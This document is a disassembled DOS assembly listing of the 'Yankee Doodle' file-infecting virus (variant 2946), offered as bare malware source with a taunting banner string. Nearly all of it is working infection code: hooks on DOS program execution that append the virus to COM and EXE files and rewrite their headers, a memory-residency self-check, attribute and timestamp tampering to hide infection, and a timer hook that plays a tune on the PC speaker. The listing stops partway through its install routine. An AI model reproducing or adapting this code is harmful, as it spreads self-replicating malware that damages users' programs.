


; Yankee Doodle

data_1e		equ	0C5h
data_2e		equ	0C7h
data_3e		equ	413h
data_4e		equ	5Bh
data_5e		equ	32Eh
data_6e		equ	6Ch
data_7e		equ	6Eh
data_8e		equ	0
data_9e		equ	2
data_10e	equ	4
data_11e	equ	6
data_12e	equ	8
data_13e	equ	0Ah
data_14e	equ	0Bh
data_15e	equ	0Ch
data_16e	equ	0Eh
data_17e	equ	10h
data_18e	equ	11h
data_19e	equ	12h
data_20e	equ	16h
data_21e	equ	18h
data_22e	equ	1Ah
data_23e	equ	1Ch
data_24e	equ	1Eh
data_25e	equ	20h
data_26e	equ	2Ah
data_27e	equ	2Eh
data_28e	equ	30h
data_29e	equ	32h
data_30e	equ	34h
data_31e	equ	36h
data_32e	equ	3Ah
data_33e	equ	3Ch
data_34e	equ	3Eh
data_35e	equ	40h
data_36e	equ	42h
data_37e	equ	43h
data_38e	equ	44h
data_39e	equ	46h
data_40e	equ	5Ah
data_41e	equ	5Bh
data_42e	equ	5Ch
data_43e	equ	5Dh
data_44e	equ	5Eh
data_45e	equ	5Fh
data_46e	equ	60h
data_47e	equ	62h
data_48e	equ	64h
data_49e	equ	66h
data_50e	equ	68h
data_59e	equ	0
data_60e	equ	2
data_61e	equ	4
data_62e	equ	6
data_63e	equ	8
data_64e	equ	0Ah
data_65e	equ	0Ch
data_66e	equ	0Eh
data_67e	equ	93h
data_68e	equ	94h
data_69e	equ	17Ah
data_70e	equ	1FBh

code_seg_a	segment
		assume	cs:code_seg_a, ds:code_seg_a


		org	100h

2946		proc	far

start:
		jmp	loc_51
data_52		db	'HA-HA-HA ! Ja s', 3, 0, ' virus '
		db	'2946 !', 0Dh, 0Ah, '$'
		db	0B4h, 9, 8Dh, 16h, 3, 1
		db	0CDh, 21h, 0B4h, 4Ch, 0CDh, 21h
		db	0F4h, 7Ah, 29h, 0, 0, 0
		db	30h, 0, 0EEh, 0Ah, 0EBh, 22h
		db	90h
		db	'HA-HA-HA ! Ja som virus 2946 `'
		db	14h, 2Fh, 2, 60h, 14h, 2Fh
		db	2, 56h, 5, 78h, 0Bh, 53h
		db	0FFh, 0, 0F0h, 20h, 0, 5
		db	0, 36h, 2
		db	21h
loc_2:
		add	[bx+si],al
		add	dh,bl
		add	[bp+si+0],ch
		cmp	cs:data_57,5Ch
		pop	es
		jo	loc_4				; Jump if overflow=1
loc_4:
		cmp	cs:data_57,5Ch
		pop	es
		jo	loc_77				; Jump if overflow=1
loc_77:
		add	[bx+si],ax
		add	[bx+si],ax
		add	[bx+di],al
		add	[bx+si],al
		adc	[bx+si],al
		add	[bx+di],al
		add	[bp+si],al
		mov	bl,2
		db	0C7h, 11h, 0C7h, 11h, 0E6h, 0Fh
		db	28h, 0Eh, 0C7h, 11h, 28h, 0Eh
		db	0E6h, 0Fh, 0C4h, 17h, 0C7h, 11h
		db	0C7h, 11h, 0E6h, 0Fh, 28h, 0Eh
		db	0C7h, 11h, 0C7h, 11h, 0C7h, 11h
		db	0C7h, 11h, 0E6h, 0Fh, 28h, 0Eh
		db	59h, 0Dh, 28h, 0Eh, 0E6h, 0Fh
		db	0C7h, 11h, 0EFh, 12h, 0C4h, 17h
		db	2Ch, 15h, 0EFh, 12h, 0C7h, 11h
		db	0C7h, 11h, 2Ch, 15h, 0EFh, 12h
		db	2Ch, 15h, 0C5h, 1Ah, 2Ch, 15h
		db	0EFh, 12h, 0C7h, 11h, 2Ch, 15h
		db	0C4h, 17h, 2Ch, 15h, 0C4h, 17h
		db	0C5h, 1Ah, 67h, 1Ch, 0C5h, 1Ah
		db	0C4h, 17h, 2Ch, 15h, 0EFh, 12h
		db	2Ch, 15h, 0C5h, 1Ah, 2Ch, 15h
		db	0EFh, 12h, 0C7h, 11h, 2Ch, 15h
		db	0C4h, 17h, 0C7h, 11h, 0EFh, 12h
		db	0E6h, 0Fh, 0C7h, 11h, 0C7h, 11h
		db	0FFh, 0FFh, 5
		db	11 dup (5)
		db	9, 9
		db	12 dup (5)
		db	9, 9
		db	14 dup (5)
		db	6
		db	7 dup (5)
		db	6, 5, 5, 5, 5, 9
		db	9, 0FEh, 6, 7Ah, 7Dh, 0FEh
		db	6, 0FBh, 7Dh, 74h, 5, 0EAh
		db	0, 7Ch, 0, 0, 0FCh, 33h
		db	0C0h, 8Eh, 0C0h, 0BEh, 2Ah, 7Dh
		db	0BFh, 4Ch, 0, 0A5h, 0A5h, 26h
		db	83h, 6, 13h, 4, 2, 0EAh
		db	0, 7Ch, 0, 0

2946		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		push	si
		push	ds
		push	cx
		push	ds
		pop	es
		mov	ds,ds:data_46e
		lds	si,dword ptr [bx]		; Load 32 bit ptr
		mov	es:[di+5],si
		mov	es:[di+7],ds
		cmp	byte ptr [si],0CFh
		je	loc_5				; Jump if equal
		cld					; Clear direction
		mov	cx,5
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		mov	byte ptr [si-5],9Ah
		mov	word ptr [si-4],1AEh
		mov	[si-2],cs
loc_5:
		pop	cx
		pop	ds
		pop	si
		ret
sub_1		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
		push	bx
		push	di
		mov	bx,4
		mov	di,48h
		call	sub_1
		mov	bx,0Ch
		mov	di,51h
		call	sub_1
		pop	di
		pop	bx
		ret
sub_2		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3		proc	near
		push	cx
		push	di
		les	di,dword ptr [si+5]		; Load 32 bit ptr
		cmp	byte ptr es:[di],9Ah
		jne	loc_6				; Jump if not equal
		cmp	word ptr es:[di+1],1AEh
		jne	loc_6				; Jump if not equal
		mov	cx,5
		cld					; Clear direction
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
loc_6:
		pop	di
		pop	cx
		ret
sub_3		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_4		proc	near
		push	si
		mov	si,51h
		call	sub_3
		mov	si,48h
		call	sub_3
		pop	si
		ret
sub_4		endp

		push	bp
		mov	bp,sp
		pushf					; Push flags
		push	es
		push	ds
		push	bx
		push	ax
		push	cs
		pop	ds
		call	sub_4
		mov	ax,cs
		cmp	[bp+8],ax
		je	loc_8				; Jump if equal
		mov	ds,[bp+8]
		cmp	word ptr [bx+2],29h
		jne	loc_7				; Jump if not equal
		cmp	word ptr [bx+0],7AF4h
		jne	loc_7				; Jump if not equal
		cmp	word ptr [bx+8],0AEEh
		jne	loc_7				; Jump if not equal
		mov	ax,ds
		shr	bx,1				; Shift w/zeros fill
		shr	bx,1				; Shift w/zeros fill
		shr	bx,1				; Shift w/zeros fill
		shr	bx,1				; Shift w/zeros fill
		add	ax,bx
		mov	ds,ax
		jmp	short loc_8
loc_7:
		sub	word ptr [bp+2],5
		pop	ax
		pop	bx
		pop	ds
		pop	es
		popf					; Pop flags
		pop	bp
		ret					; Return far
loc_8:
		call	sub_6
		mov	ax,[bp+0Ah]
		inc	byte ptr ds:data_4e
		test	ax,100h
		jnz	loc_9				; Jump if not zero
		dec	word ptr [bp+6]
		dec	byte ptr ds:data_4e
loc_9:
		and	ax,0FEFFh
		mov	[bp+0Ah],ax
		push	cs
		pop	ds
		call	sub_2
		pop	ax
		pop	bx
		pop	ds
		pop	es
		popf					; Pop flags
		pop	bp
		add	sp,4
		iret					; Interrupt return
		push	bp
		mov	bp,sp
		pushf					; Push flags
		push	ax
		push	bx
		push	ds
		push	es
		push	cs
		pop	ds
		call	sub_4
		call	sub_2
		mov	ax,40h
		mov	es,ax
		cmp	word ptr es:data_7e,11h
		jne	loc_10				; Jump if not equal
		cmp	word ptr es:data_6e,0
		jne	loc_10				; Jump if not equal
		mov	byte ptr ds:data_40e,0
		mov	word ptr ds:data_38e,0DEh
		mov	word ptr ds:data_39e,6Ah
loc_10:
		cmp	byte ptr ds:data_40e,1
		je	loc_13				; Jump if equal
		cmp	byte ptr ds:data_37e,0
		je	loc_11				; Jump if equal
		dec	byte ptr ds:data_37e
		jmp	short loc_13
loc_11:
		mov	bx,ds:data_39e
		cmp	word ptr [bx],0FFFFh
		jne	loc_12				; Jump if not equal
		in	al,61h				; port 61h, 8255 port B, read
		and	al,0FCh
		out	61h,al				; port 61h, 8255 B - spkr, etc
		mov	byte ptr ds:data_40e,1
		jmp	short loc_13
loc_12:
		mov	al,0B6h
		out	43h,al				; port 43h, 8253 wrt timr mode
		mov	ax,[bx]
		out	42h,al				; port 42h, 8253 timer 2 spkr
		mov	al,ah
		out	42h,al				; port 42h, 8253 timer 2 spkr
		in	al,61h				; port 61h, 8255 port B, read
		or	al,3
		out	61h,al				; port 61h, 8255 B - spkr, etc
		add	word ptr ds:data_39e,2
		mov	bx,ds:data_38e
		mov	al,[bx]
		dec	al
		mov	ds:data_37e,al
		inc	word ptr ds:data_38e
loc_13:
		pop	es
		pop	ds
		pop	bx
		pop	ax
		popf					; Pop flags
		pop	bp
		jmp	dword ptr cs:data_31e
		jmp	dword ptr cs:data_26e
		jmp	dword ptr ds:data_26e

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5		proc	near
		push	bp
		mov	bp,sp
		cld					; Clear direction
		push	word ptr [bp+0Ah]
		push	word ptr [bp+8]
		push	word ptr [bp+4]
		call	sub_14
		add	sp,6
		push	word ptr [bp+0Ch]
		push	word ptr [bp+6]
		push	word ptr [bp+8]
		call	sub_15
		add	sp,6
		push	word ptr [bp+0Ch]
		push	word ptr [bp+8]
		push	word ptr [bp+6]
		push	word ptr [bp+4]
		call	sub_16
		add	sp,8
		pop	bp
		ret
sub_5		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_6		proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	es
		pushf					; Push flags
		cli					; Disable interrupts
		mov	ax,8
		push	ax
		mov	ax,0B1h
		push	ax
		mov	ax,0B70h
		mov	cl,4
		shr	ax,cl				; Shift w/zeros fill
		mov	dx,ds
		add	ax,dx
		push	ax
		mov	ax,0AF0h
		shr	ax,cl				; Shift w/zeros fill
		add	ax,dx
		push	ax
		mov	ax,60h
		shr	ax,cl				; Shift w/zeros fill
		add	ax,dx
		push	ax
		call	sub_5
		add	sp,0Ah
		popf					; Pop flags
		pop	es
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		ret
sub_6		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_7		proc	near
		pushf					; Push flags
		cli					; Disable interrupts
		call	dword ptr cs:data_27e
		ret
sub_7		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_8		proc	near
		push	bx
		push	ax
		mov	bx,cs:data_33e
		mov	ah,45h				; 'E'
		call	sub_7
		jc	loc_14				; Jump if carry Set
		mov	bx,ax
		mov	ah,3Eh				; '>'
		call	sub_7
		jmp	short loc_15
loc_14:
		clc					; Clear carry flag
loc_15:
		pop	ax
		pop	bx
		ret
sub_8		endp

		mov	al,3
		iret					; Interrupt return
loc_16:
		mov	ax,2Ah
		test	byte ptr cs:data_45e,2
		jnz	loc_17				; Jump if not zero
		dec	ax
loc_17:
		cmp	bx,ax
		xor	al,al				; Zero register
		rcl	al,1				; Rotate thru carry
		push	ax
		mov	ax,29h
		test	byte ptr cs:data_45e,4
		jnz	loc_18				; Jump if not zero
		inc	ax
loc_18:
		cmp	bx,ax
		les	bx,dword ptr cs:data_27e	; Load 32 bit ptr
		pop	ax
		inc	sp
		inc	sp
		sti					; Enable interrupts
		ret	2				; Return far
loc_19:
		mov	ax,29h
		jmp	short loc_22
loc_20:
		mov	al,cs:data_45e
		xor	ah,ah				; Zero register
		jmp	short loc_22
loc_21:
		mov	cs:data_45e,cl
		jmp	short loc_22
		nop
		pushf					; Push flags
		cmp	ah,4Bh				; 'K'
		je	loc_23				; Jump if equal
		cmp	ah,0C5h
		je	loc_22				; Jump if equal
		cmp	ax,0C600h
		je	loc_19				; Jump if equal
		cmp	ax,0C601h
		je	loc_20				; Jump if equal
		cmp	ax,0C602h
		je	loc_21				; Jump if equal
		cmp	ax,0C603h
		je	loc_16				; Jump if equal
		popf					; Pop flags
		jmp	loc_46
loc_22:
		popf					; Pop flags
		sti					; Enable interrupts
		stc					; Set carry flag
		ret	2				; Return far
loc_23:
		push	ax
		xor	al,al				; Zero register
		xchg	al,cs:data_43e
		or	al,al				; Zero ?
		pop	ax
		jnz	loc_24				; Jump if not zero
		popf					; Pop flags
		jmp	loc_46
loc_24:
		push	ds
		push	cs
		pop	ds
		call	sub_6
		mov	word ptr ds:data_5e,9090h
		call	sub_6
		pop	ds
		push	es
		push	ds
		push	bp
		push	di
		push	si
		push	dx
		push	cx
		push	bx
		push	ax
		mov	bp,sp
		push	cs
		pop	ds
		cmp	byte ptr ds:data_41e,0
		je	loc_25				; Jump if equal
		jmp	loc_45
loc_25:
		push	word ptr [bp+0Eh]
		push	word ptr [bp+6]
		call	sub_9
		lahf					; Load ah from flags
		add	sp,4
		sahf					; Store ah into flags
		jnc	loc_26				; Jump if carry=0
		jmp	loc_45
loc_26:
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		mov	bx,ds:data_33e
		call	sub_7
		jc	loc_29				; Jump if carry Set
		mov	dx,0Ah
		mov	ah,3Fh				; '?'
		mov	cx,14h
		call	sub_7
		jc	loc_29				; Jump if carry Set
		cmp	ax,14h
		jne	loc_29				; Jump if not equal
		mov	ax,ds:data_23e
		mul	word ptr ds:data_47e		; ax = data * ax
		mov	cx,dx
		mov	dx,ax
		mov	ax,4200h
		call	sub_7
		jc	loc_31				; Jump if carry Set
		mov	dx,0
		mov	cx,2Ah
		mov	ah,3Fh				; '?'
		call	sub_7
		jc	loc_31				; Jump if carry Set
		cmp	ax,2Ah
		jne	loc_31				; Jump if not equal
		cmp	word ptr ds:data_8e,7AF4h
		jne	loc_31				; Jump if not equal
		mov	ax,29h
		cmp	byte ptr [bp],0
		jne	loc_27				; Jump if not equal
		test	byte ptr ds:data_45e,2
		jz	loc_28				; Jump if zero
loc_27:
		inc	ax
loc_28:
		cmp	ds:data_9e,ax
		jae	loc_29				; Jump if above or =
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_7
		jc	loc_29				; Jump if carry Set
		mov	ah,40h				; '@'
		mov	dx,0Ah
		mov	cx,20h
		call	sub_7
		jc	loc_29				; Jump if carry Set
		cmp	ax,20h
		jne	loc_29				; Jump if not equal
		call	sub_8
		jnc	loc_30				; Jump if carry=0
loc_29:
		jmp	loc_44
loc_30:
		mov	ax,4200h
		mov	cx,ds:data_10e
		mov	dx,ds:data_11e
		call	sub_7
		jc	loc_29				; Jump if carry Set
		mov	ah,40h				; '@'
		xor	cx,cx				; Zero register
		call	sub_7
		jc	loc_29				; Jump if carry Set
		call	sub_8
		jc	loc_29				; Jump if carry Set
		jmp	loc_26
loc_31:
		mov	ax,4202h
		mov	cx,0FFFFh
		mov	dx,0FFF8h
		mov	bx,ds:data_33e
		call	sub_7
		jc	loc_32				; Jump if carry Set
		mov	dx,0Ah
		mov	cx,8
		mov	ah,3Fh				; '?'
		call	sub_7
		jc	loc_32				; Jump if carry Set
		cmp	ax,8
		jne	loc_32				; Jump if not equal
		cmp	word ptr ds:data_16e,7AF4h
		je	loc_33				; Jump if equal
		jmp	short loc_36
		nop
loc_32:
		jmp	loc_44
loc_33:
		cmp	byte ptr ds:data_17e,23h	; '#'
		jae	loc_32				; Jump if above or =
		mov	cl,ds:data_18e
		mov	ax,ds:data_13e
		mov	ds:data_11e,ax
		mov	ax,ds:data_15e
		sub	ax,103h
		mov	ds:data_14e,ax
		cmp	byte ptr ds:data_17e,9
		ja	loc_34				; Jump if above
		mov	cl,0E9h
loc_34:
		mov	ds:data_13e,cl
		mov	ax,4200h
		xor	cx,cx				; Zero register
		mov	dx,cx
		call	sub_7
		jc	loc_32				; Jump if carry Set
		mov	ah,40h				; '@'
		mov	dx,0Ah
		mov	cx,3
		call	sub_7
		jc	loc_32				; Jump if carry Set
		cmp	ax,3
		jne	loc_32				; Jump if not equal
		call	sub_8
		jc	loc_32				; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx				; Zero register
		mov	dx,ds:data_11e
		call	sub_7
		jc	loc_32				; Jump if carry Set
		mov	ah,40h				; '@'
		xor	cx,cx				; Zero register
		call	sub_7
		jc	loc_35				; Jump if carry Set
		call	sub_8
		jc	loc_35				; Jump if carry Set
		jmp	loc_31
loc_35:
		jmp	loc_44
loc_36:
		mov	word ptr ds:data_8e,7AF4h
		mov	word ptr ds:data_9e,29h
		mov	word ptr ds:data_12e,0AEEh
		cmp	byte ptr [bp],0
		jne	loc_35				; Jump if not equal
		test	byte ptr ds:data_45e,1
		jz	loc_35				; Jump if zero
		mov	ax,4202h
		xor	cx,cx				; Zero register
		mov	dx,cx
		mov	bx,ds:data_33e
		call	sub_7
		jc	loc_35				; Jump if carry Set
		mov	ds:data_10e,dx
		mov	ds:data_11e,ax
		mov	ax,4200h
		xor	cx,cx				; Zero register
		mov	dx,cx
		call	sub_7
		jc	loc_35				; Jump if carry Set
		mov	dx,0Ah
		mov	cx,20h
		mov	ah,3Fh				; '?'
		call	sub_7
		jc	loc_35				; Jump if carry Set
		cmp	ax,20h
		jne	loc_35				; Jump if not equal
		cmp	word ptr ds:data_13e,5A4Dh
		je	loc_37				; Jump if equal
		cmp	word ptr ds:data_13e,4D5Ah
		je	loc_37				; Jump if equal
		jmp	short loc_38
		nop
loc_37:
		mov	byte ptr ds:data_42e,0
		cmp	word ptr ds:data_20e,0FFFFh
		jne	loc_35				; Jump if not equal
		mov	ax,ds:data_16e
		mul	word ptr ds:data_49e		; ax = data * ax
		sub	ax,ds:data_11e
		sbb	dx,ds:data_10e
		jc	loc_40				; Jump if carry Set
		mov	ax,ds:data_21e
		mul	word ptr ds:data_47e		; ax = data * ax
		add	ax,ds:data_22e
		mov	cx,dx
		mov	bx,ax
		mov	ax,ds:data_19e
		mul	word ptr ds:data_47e		; ax = data * ax
		mov	di,ds:data_10e
		mov	si,ds:data_11e
		add	si,0Fh
		adc	di,0
		and	si,0FFF0h
		sub	si,ax
		sbb	di,dx
		mov	dx,cx
		mov	ax,bx
		sub	ax,si
		sbb	dx,di
		jc	loc_39				; Jump if carry Set
		add	si,0DF0h
		adc	di,0
		sub	bx,si
		sbb	cx,di
		jnc	loc_39				; Jump if carry=0
		jmp	loc_44
loc_38:
		mov	byte ptr ds:data_42e,1
		cmp	word ptr ds:data_10e,0
		jne	loc_40				; Jump if not equal
		cmp	word ptr ds:data_11e,20h
		jbe	loc_40				; Jump if below or =
		cmp	word ptr ds:data_11e,0F247h
		jae	loc_40				; Jump if above or =
loc_39:
		mov	ax,4200h
		mov	cx,ds:data_10e
		mov	dx,ds:data_11e
		add	dx,0Fh
		adc	cx,0
		and	dx,0FFF0h
		mov	bx,ds:data_33e
		call	sub_7
		jnc	loc_41				; Jump if carry=0
loc_40:
		jmp	loc_44
loc_41:
		xor	dx,dx				; Zero register
		mov	cx,0B70h
		mov	ah,40h				; '@'
		push	word ptr ds:data_45e
		mov	byte ptr ds:data_45e,1
		call	sub_7
		pop	cx
		mov	ds:data_45e,cl
		jc	loc_40				; Jump if carry Set
		cmp	ax,0B70h
		jne	loc_40				; Jump if not equal
		mov	cx,4
		mov	ah,40h				; '@'
		call	sub_7
		call	sub_8
		jc	loc_40				; Jump if carry Set
		mov	dx,ds:data_10e
		mov	ax,ds:data_11e
		add	ax,0Fh
		and	ax,0FFF0h
		div	word ptr ds:data_47e		; ax,dxrem=dx:ax/data
		mov	ds:data_23e,ax
		cmp	byte ptr ds:data_42e,0
		je	loc_42				; Jump if equal
		mul	word ptr ds:data_47e		; ax = data * ax
		mov	byte ptr ds:data_13e,0E9h
		add	ax,7FFh
		mov	ds:data_14e,ax
		jmp	short loc_43
loc_42:
		mov	ds:data_25e,ax
		mov	word ptr ds:data_24e,802h
		mul	word ptr ds:data_47e		; ax = data * ax
		add	ax,0B70h
		adc	dx,0
		div	word ptr ds:data_49e		; ax,dxrem=dx:ax/data
		inc	ax
		mov	ds:data_16e,ax
		mov	ds:data_15e,dx
		mov	ax,ds:data_19e
		sub	ds:data_25e,ax
loc_43:
		mov	ax,4200h
		xor	cx,cx				; Zero register
		mov	dx,cx
		call	sub_7
		jc	loc_44				; Jump if carry Set
		mov	dx,0Ah
		mov	cx,20h
		mov	ah,40h				; '@'
		call	sub_7
loc_44:
		push	word ptr [bp+0Eh]
		push	word ptr [bp+6]
		call	sub_10
		add	sp,4
loc_45:
		mov	byte ptr ds:data_43e,0FFh
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	si
		pop	di
		pop	bp
		pop	ds
		pop	es
		popf					; Pop flags
loc_46:
		pushf					; Push flags
		push	cs
		push	word ptr cs:data_50e
		cmp	byte ptr cs:data_41e,0
		jne	loc_47				; Jump if not equal
		iret					; Interrupt return
loc_47:
		push	bp
		mov	bp,sp
		or	word ptr [bp+6],100h
		mov	byte ptr cs:data_41e,0
		pop	bp
		iret					; Interrupt return

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_9		proc	near
		push	bp
		mov	bp,sp
		push	es
		push	dx
		push	cx
		push	bx
		push	ax
		mov	ax,3300h
		call	sub_7
		mov	ds:data_44e,dl
		mov	ax,3301h
		xor	dl,dl				; Zero register
		call	sub_7
		mov	ax,3524h
		call	sub_7
		mov	ds:data_30e,es
		mov	ds:data_29e,bx
		mov	dx,351h
		mov	ax,2524h
		call	sub_7
		mov	ax,4300h
		push	ds
		lds	dx,dword ptr [bp+4]		; Load 32 bit ptr
		call	sub_7
		pop	ds
		jc	loc_49				; Jump if carry Set
		mov	ds:data_32e,cx
		mov	ax,4301h
		push	ds
		and	cl,0FEh
		lds	dx,dword ptr [bp+4]		; Load 32 bit ptr
		call	sub_7
		pop	ds
		jc	loc_49				; Jump if carry Set
		mov	ax,3D02h
		push	ds
		lds	dx,dword ptr [bp+4]		; Load 32 bit ptr
		call	sub_7
		pop	ds
		jc	loc_48				; Jump if carry Set
		mov	ds:data_33e,ax
		mov	bx,ax
		mov	ax,5700h
		call	sub_7
		mov	ds:data_34e,cx
		mov	ds:data_35e,dx
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	es
		pop	bp
		clc					; Clear carry flag
		ret

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_10:
		push	bp
		mov	bp,sp
		push	es
		push	dx
		push	cx
		push	bx
		push	ax
		mov	bx,ds:data_33e
		mov	cx,ds:data_34e
		mov	dx,ds:data_35e
		mov	ax,5701h
		call	sub_7
		mov	ah,3Eh				; '>'
		call	sub_7
loc_48:
		mov	ax,4301h
		push	ds
		mov	cx,ds:data_32e
		lds	dx,dword ptr [bp+4]		; Load 32 bit ptr
		call	sub_7
		pop	ds
loc_49:
		mov	ax,2524h
		push	ds
		lds	dx,dword ptr ds:data_29e	; Load 32 bit ptr
		call	sub_7
		pop	ds
		mov	dl,ds:data_44e
		mov	ax,3301h
		call	sub_7
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	es
		pop	bp
		stc					; Set carry flag
		ret
sub_9		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_11		proc	near
		pop	cx
		mov	dx,200h
		cmp	byte ptr cs:[bx+5Bh],0
		je	loc_50				; Jump if equal
		mov	dh,3
loc_50:
		push	dx
		push	cs
		push	cx
		inc	bx
		iret					; Interrupt return
sub_11		endp

loc_51:
		call	sub_12

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_12		proc	near
		pop	bx
		sub	bx,805h
		mov	byte ptr cs:[bx+5Dh],0FFh
		cld					; Clear direction
		cmp	byte ptr cs:[bx+5Ch],0
		je	loc_52				; Jump if equal
		mov	si,0Ah
		add	si,bx
		mov	di,100h
		mov	cx,20h
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		push	cs
		push	word ptr cs:data_48e[bx]
		push	es
		push	ds
		push	ax
		jmp	short loc_53
loc_52:
		mov	dx,ds
		add	dx,10h
		add	dx,cs:data_25e
		push	dx
		push	word ptr cs:data_24e
		push	es
		push	ds
		push	ax
loc_53:
		push	bx
		mov	bx,29h
		clc					; Clear carry flag
		mov	ax,0C603h
		int	21h				; DOS Services  ah=function C6h
		pop	bx
		jnc	loc_78				; Jump if carry=0
loc_54:
		pop	ax
		pop	ds
		pop	es
		call	sub_11
		ret					; Return far
loc_78:
		cmp	byte ptr cs:[bx+5Ch],0
		je	loc_79				; Jump if equal
		cmp	sp,0FFF0h
		jb	loc_54				; Jump if below
loc_79:
		mov	ax,ds
		dec	ax
		mov	es,ax
		mov	ax,es:data_71
		sub	ax,0BFh
		cmp	ax,1000h
		jb	loc_54				; Jump if below
		mov	es:data_71,ax
		sub	es:data_72,0BFh
		mov	es,es:data_72
		xor	di,di				; Zero register
		mov	si,bx
		mov	cx,0B70h
		db	0F3h, 2Eh, 0A4h, 6, 1Fh, 53h
